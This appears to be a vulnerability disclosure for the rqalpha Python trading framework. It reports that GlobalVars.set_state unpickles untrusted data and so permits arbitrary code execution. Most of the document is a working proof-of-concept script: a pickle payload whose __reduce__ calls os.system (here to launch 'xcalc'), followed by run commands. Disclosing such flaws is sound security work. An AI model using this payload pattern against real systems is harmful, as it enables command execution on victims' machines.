# Description
rqalpha is an extendable, replaceable Python algorithmic backtest && trading framework supporting multiple securities . 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install rqalpha')
from rqalpha.core import global_var
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
global_var.GlobalVars.set_state(dumps,dumps)
```
* `pip3 install rqalpha`
* `python3 exploit.py`
